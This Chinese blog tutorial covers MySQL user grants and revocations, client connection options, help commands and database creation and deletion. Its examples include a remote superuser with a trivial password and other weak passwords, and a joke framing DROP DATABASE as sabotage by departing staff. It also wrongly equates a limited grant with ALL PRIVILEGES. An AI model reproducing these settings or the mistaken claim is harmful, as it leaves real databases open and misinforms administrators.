

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="liaoyue">
  <meta name="keywords" content="">
  
    <meta name="description" content="Mysql（二）0.前言&amp;emsp;&amp;emsp;前篇对mysql的编译安装进行了相关的内容阐述，接下来就是对于两种运维中常用并且是不同类型的数据库进行讲述，mysql与redis这两种典型的关系型数据库和非关系类型数据，关系型数据库是指采用了关系模型来组织数据的数据库。简单来说，关系模式就是二维表格模型，而大都是针对一些特性的应用需求出现的。根据结构化方法和应用场景的不同，也有不同的类型（key-">
<meta property="og:type" content="article">
<meta property="og:title" content="Mysql（二）">
<meta property="og:url" content="https://one-null-pointer.github.io/2023/06/04/Mysql%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
<meta property="og:site_name" content="one-null-poniter">
<meta property="og:description" content="Mysql（二）0.前言&amp;emsp;&amp;emsp;前篇对mysql的编译安装进行了相关的内容阐述，接下来就是对于两种运维中常用并且是不同类型的数据库进行讲述，mysql与redis这两种典型的关系型数据库和非关系类型数据，关系型数据库是指采用了关系模型来组织数据的数据库。简单来说，关系模式就是二维表格模型，而大都是针对一些特性的应用需求出现的。根据结构化方法和应用场景的不同，也有不同的类型（key-">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://one-null-pointer.github.io/img/Linux.png">
<meta property="article:published_time" content="2023-06-04T08:29:07.000Z">
<meta property="article:modified_time" content="2023-08-13T09:56:37.378Z">
<meta property="article:author" content="liaoyue">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://one-null-pointer.github.io/img/Linux.png">
  
  
  
  <title>Mysql（二） - one-null-poniter</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"one-null-pointer.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>one null pointer</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                吾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                學
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                類
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Mysql（二）"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-06-04 16:29" pubdate>
          June 4, 2023 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          15k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          128 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Mysql（二）</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Mysql（二）"><a href="#Mysql（二）" class="headerlink" title="Mysql（二）"></a>Mysql（二）</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;前篇对mysql的编译安装进行了相关的内容阐述，接下来就是对于两种运维中常用并且是不同类型的数据库进行讲述，mysql与redis这两种典型的关系型数据库和非关系类型数据，关系型数据库是指采用了关系模型来组织数据的数据库。简单来说，关系模式就是二维表格模型，而大都是针对一些特性的应用需求出现的。根据结构化方法和应用场景的不同，也有不同的类型（key-value数据库、面向文档数据库、分布式数据库等）</p>
<p>&emsp;</p>
<h4 id="1-用户权限管理"><a href="#1-用户权限管理" class="headerlink" title="1.用户权限管理"></a>1.用户权限管理</h4><p>&emsp;&emsp;MySQL用户权限管理是非常重要的，可以保护数据库的安全性和完整性。以下是一些基本的MySQL用户权限管理方法：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">创建用户：使用<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span>语句创建新用户，并指定用户名和密码。<br>授予权限：使用<span class="hljs-keyword">GRANT</span>语句授予用户特定的权限，例如<span class="hljs-keyword">SELECT</span>、<span class="hljs-keyword">INSERT</span>、<span class="hljs-keyword">UPDATE</span>、<span class="hljs-keyword">DELETE</span>等。<br>撤销权限：使用<span class="hljs-keyword">REVOKE</span>语句撤销用户的权限。<br>删除用户：使用<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">USER</span>语句删除不再需要的用户。<br>修改密码：使用<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span>语句修改用户的密码。<br>查看权限：使用<span class="hljs-keyword">SHOW</span> GRANTS语句查看用户的权限。<br>管理角色：使用<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">ROLE</span>、<span class="hljs-keyword">GRANT</span>、<span class="hljs-keyword">REVOKE</span>和<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">ROLE</span>语句来管理角色，将权限分配给角色，然后将角色分配给用户<br></code></pre></td></tr></table></figure>

<ul>
<li><h5 id="创建远程登录的超级用户举例"><a href="#创建远程登录的超级用户举例" class="headerlink" title="创建远程登录的超级用户举例"></a>创建远程登录的超级用户举例</h5></li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;test2&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;test2&#x27;</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">grant</span> <span class="hljs-keyword">option</span>;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/10.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;这是一个MySQL授权语句，它将授予名为“test2”的用户在所有数据库和表上拥有所有权限的访问权限，并且该用户可以使用“test2”作为密码进行身份验证。此外，该语句还包含了“with grant option”选项，允许该用户将其所拥有的权限授予其他用户</p>
<ul>
<li><h5 id="创建对某库权限本地用户举例"><a href="#创建对某库权限本地用户举例" class="headerlink" title="创建对某库权限本地用户举例"></a>创建对某库权限本地用户举例</h5></li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>,<span class="hljs-keyword">INSERT</span>,<span class="hljs-keyword">UPDATE</span>,<span class="hljs-keyword">DELETE</span>,<span class="hljs-keyword">CREATE</span>,<span class="hljs-keyword">DROP</span><br><span class="hljs-keyword">ON</span> bank.*<br><span class="hljs-keyword">TO</span> ‘custom’@’localhost’<br>IDENTIFIED <span class="hljs-keyword">BY</span> ‘<span class="hljs-number">123456</span>’;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/11.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;这依旧是一个授权指令，将授予名为“custom”的用户在“bank”数据库中的所有表上执行SELECT、INSERT、UPDATE、DELETE、CREATE和DROP操作的权限，并且该用户可以使用“123456”作为密码进行身份验证。这里的GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP本质上与grant all privileges on *.*的作用是一至的，都是赋予了相应的全部权限功能</p>
<ul>
<li><h5 id="创建仅限制从某网站连接"><a href="#创建仅限制从某网站连接" class="headerlink" title="创建仅限制从某网站连接"></a>创建仅限制从某网站连接</h5></li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>,<span class="hljs-keyword">INSERT</span>,<span class="hljs-keyword">UPDATE</span>,<span class="hljs-keyword">DELETE</span>,<span class="hljs-keyword">CREATE</span>,<span class="hljs-keyword">DROP</span><br><span class="hljs-keyword">ON</span> expenses.*<br><span class="hljs-keyword">TO</span> ‘custom’@’ywjt.org’<br>IDENTIFIED <span class="hljs-keyword">BY</span> ‘<span class="hljs-number">123456</span>’;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/12.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;这里与前文相比就是将连接限制设置为了只能从ywjt.org的连接，这里出现了一个报错，我们使用SHOW WARNINGS; 进行错误查看，根据提供的信息，这里显示我们使用GRANT语句创建新用户已经被弃用，并且在未来的版本中将被删除。相反，应该使用CREATE USER语句来创建新用户</p>
<ul>
<li><h5 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h5></li>
</ul>
<p>&emsp;&emsp;显示用户权限</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">show grants <span class="hljs-keyword">for</span> <span class="hljs-symbol">&#x27;test</span><span class="hljs-string">&#x27;@&#x27;</span>localhost’;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/13.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;撤销用户权限</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">REVOKE</span> <span class="hljs-keyword">DELETE</span>, <span class="hljs-keyword">INSERT</span>, <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">ON</span> test.*<br><span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;custom&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/14.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;这是一个REVOKE语句，用于从用户“custom”在主机“localhost”上撤销对“test”数据库中所有表格的删除、插入和更新权限。</p>
<p>&emsp;&emsp;撤销用户的grant权限</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">REVOKE</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span> <span class="hljs-keyword">ON</span> test.*<br><span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;custom&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/15.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;与前面的测小用户权限用法相似，这里就不过多阐述了</p>
<ul>
<li><h5 id="用户账号"><a href="#用户账号" class="headerlink" title="用户账号"></a>用户账号</h5></li>
</ul>
<p>&emsp;&emsp;改变用户密码：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span> <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;custom&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> =<br><span class="hljs-keyword">PASSWORD</span>(<span class="hljs-string">&#x27;NewPass&#x27;</span>);<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/16.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;删除用户账号</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">user</span>‘test<span class="hljs-string">&#x27;@&#x27;</span>localhost<span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/17.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<ul>
<li><h5 id="附：思考"><a href="#附：思考" class="headerlink" title="附：思考"></a>附：思考</h5></li>
</ul>
<p>&emsp;&emsp;drop user‘test‘@’localhost’; 与该语句delete from mysql.user where user=’test’ and host=’localhost’; 的区别在哪？</p>
<p>&emsp;&emsp;与之前提到的DROP USER语句相比，这个语句使用了DELETE FROM语法来删除用户帐号。它还需要指定要删除的表（mysql.user）和WHERE子句来指定要删除的行。</p>
<p>&emsp;&emsp;虽然这两个语句都可以用于删除用户帐号，但它们的实现方式略有不同。DROP USER语句是专门用于删除用户帐号的语句，而DELETE FROM语句则可以用于删除任何表中的行。此外，DROP USER语句通常比DELETE FROM语句更快，因为它不需要执行额外的检查和约束</p>
<p>&emsp;</p>
<h4 id="2-基础命令"><a href="#2-基础命令" class="headerlink" title="2.基础命令"></a>2.基础命令</h4><ul>
<li><h5 id="简单连接"><a href="#简单连接" class="headerlink" title="简单连接"></a>简单连接</h5></li>
</ul>
<p>&emsp;&emsp;首先了解下简单的连接，当我们需要连接数据库时，使用-u指定用户，-p表示输入密码</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mysql</span> -u root –proot<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/18.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;这里需要注意的是-u与root用户名之间的空格可以省略，而密码与-p选项之间是不能存在空格的</p>
<ul>
<li><h5 id="指定数据库连接"><a href="#指定数据库连接" class="headerlink" title="指定数据库连接"></a>指定数据库连接</h5></li>
</ul>
<p>&emsp;&emsp;在连接mysql的时候，除了进入数据库使用use语句选择数据库，我们也能在登录时，使用-D指定数据库的名称，比如连接test数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql –uroot –D <span class="hljs-built_in">test</span> –proot<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/19.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<ul>
<li><h5 id="指定套接字连接"><a href="#指定套接字连接" class="headerlink" title="指定套接字连接"></a>指定套接字连接</h5></li>
</ul>
<p>&emsp;&emsp;在本地连接mysql时，我们还可以指定通过哪个套接字文件连接到数据库，通过-S指定套接字位置</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mysql -uroot -proot -S <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/mysql/my</span>sql.sock<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/20.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<ul>
<li><h5 id="指定主机和端口号连接"><a href="#指定主机和端口号连接" class="headerlink" title="指定主机和端口号连接"></a>指定主机和端口号连接</h5></li>
</ul>
<p>&emsp;&emsp;在连接mysql时，我们也可以指定连接到远程的某一台主机的mysql上，也可以指定端口，-h指定的是mysql主机，-P指定了mysql服务器对应的端口：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysql</span> -u root -proot -h <span class="hljs-number">192.168.70.176</span> -P <span class="hljs-number">3306</span><br><span class="hljs-attribute">mysql</span> -u root -proot -h <span class="hljs-number">127.0.0.1</span> -P <span class="hljs-number">3306</span><br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/21.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;可以看到我们mysql127的地址是通过的，当使用mysql -h本机ip地址命令连接MySQL服务器时出现了访问被拒绝的错误。</p>
<p>&emsp;&emsp;这是因为MySQL服务器配置了访问控制列表（ACL），并且没有允许来自该IP地址的用户访问MySQL服务器。可以尝试使用GRANT语句授权该IP地址访问MySQL服务：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> test.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;192.168.70.176&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;root&#x27;</span>;<br>FLUSH <span class="hljs-keyword">PRIVILEGES</span>;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/22.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;授权当前客户端的IP地址访问MySQL服务器：在MySQL命令行界面中输入以下命令：GRANT ALL PRIVILEGES ON database_name.* TO ‘username‘@’ip_address’ IDENTIFIED BY ‘password’;</p>
<p>&emsp;&emsp;其中，database_name是要授权访问的数据库名称，username是要授权的MySQL用户名，ip_address是当前客户端的IP地址，password是MySQL用户的密码。而FLUSH PRIVILEGES;s 将刷新MySQL服务器的权限表，使新的授权生效。可以看到最后是指定ip地址服务成功了，用连接其他主机的ip地址也是一个道理，不过需要注意的是防火墙放行问题</p>
<ul>
<li><h5 id="连接数据库并执行对应命令"><a href="#连接数据库并执行对应命令" class="headerlink" title="连接数据库并执行对应命令"></a>连接数据库并执行对应命令</h5></li>
</ul>
<p>&emsp;&emsp;在mysql中，连接数据库的同时，并返回对应的结果是允许的，比如：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">mysql -uroot -proot -e &#x27;<span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span> testdb; show databases;&#x27;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/23.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<ul>
<li><h5 id="其他连接诶数据库常用选项"><a href="#其他连接诶数据库常用选项" class="headerlink" title="其他连接诶数据库常用选项"></a>其他连接诶数据库常用选项</h5></li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">–compress, -C：数据压缩传输<br>–<span class="hljs-keyword">execute</span>=<span class="hljs-keyword">statement</span>, -e <span class="hljs-keyword">statement</span>：非交互模式执行<span class="hljs-keyword">SQL</span>语句；<br>–vertical, -E：查询结果纵向显示；<br>–protocol=&#123;TCP|SOCKET|PIPE|MEMORY&#125;：<br></code></pre></td></tr></table></figure>

<p>&emsp;</p>
<h4 id="3-基础语法"><a href="#3-基础语法" class="headerlink" title="3.基础语法"></a>3.基础语法</h4><ul>
<li><h5 id="数据库帮助相关语法"><a href="#数据库帮助相关语法" class="headerlink" title="数据库帮助相关语法"></a>数据库帮助相关语法</h5></li>
</ul>
<p>&emsp;&emsp;在我们连接进入mysql数据库后，我们可以使用help命令或者是\？进行帮助信息的获取，首先是可以直接使用hlep</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/24.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;也可以指定相关的关键字查看具体命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span> show<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/25.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;当获取到相关信息后，我们可以细化关键词的信息，达到进一步查询的目的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span> show databases<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/26.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;除此之外，我们还能够通过分类查看帮助，使用contents命令进行查看，使用help的方法大致重要是这几种，其他的这里就不作跟多的阐述和表达了</p>
<ul>
<li><h5 id="数据库中库相关语法"><a href="#数据库中库相关语法" class="headerlink" title="数据库中库相关语法"></a>数据库中库相关语法</h5></li>
</ul>
<p>&emsp;&emsp;首先是创建数据库的基本语法为：</p>
<center><img src="/img/Linux运维——Mysql（二）/27.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;首先是database/schema，在mysql 5.0.2之后，创建数据库就可以不用区分这两个的区别了，但需要注意的是在其他关系型数据库中，这两者是有区别的，Database是指在计算机系统中，按照一定的数据结构组织、存储和管理数据的集合。而Schema则是指数据库中的一个逻辑结构，用于描述数据库中的表、字段、索引等对象之间的关系</p>
<p>&emsp;&emsp;if not exists表示在对应的数据库不存在的时候才会创建，if not exists被中括号括起来，表示此项为可选，create_specification表示我们可以在创建数据库时指定对应的数据库规范，接下来进行创建库的演示：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span> testdb <br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/28.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;列出已经存在的数据库：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">database</span>；<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/29.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;列出创建对应数据库：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> testdb;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/30.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;查询库的排序方式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">collation</span>;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/31.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;查看当前数据库与当前连接相关信息：</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">use</span> zabbix<br><span class="hljs-keyword">status</span><br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/32.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;如图所示，信息表明了正在使用MySQL 5.7.24版本，并且当前连接到名为zabbix的数据库。还可以看到一些有关服务器和连接的详细信息，例如服务器的字符集、连接ID、运行时间等。</p>
<p>&emsp;&emsp;Threads表示当前服务器中正在运行的线程数，Questions表示自服务器启动以来处理的查询数，Slow queries表示慢查询数，Opens表示打开的表数，Flush tables表示刷新表的次数，Open tables表示当前打开的表数，Queries per second avg表示平均每秒处理的查询数。</p>
<p>&emsp;&emsp;很多时候，公司待不下去了，就会有跑路的想法，这就需要我们的删库跑路语句，其和创建数据库的语法基本差不多，只是判断没存在改为了判断存在（删库别慌，牢底做到穿）：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">exists</span> testdb;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/33.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

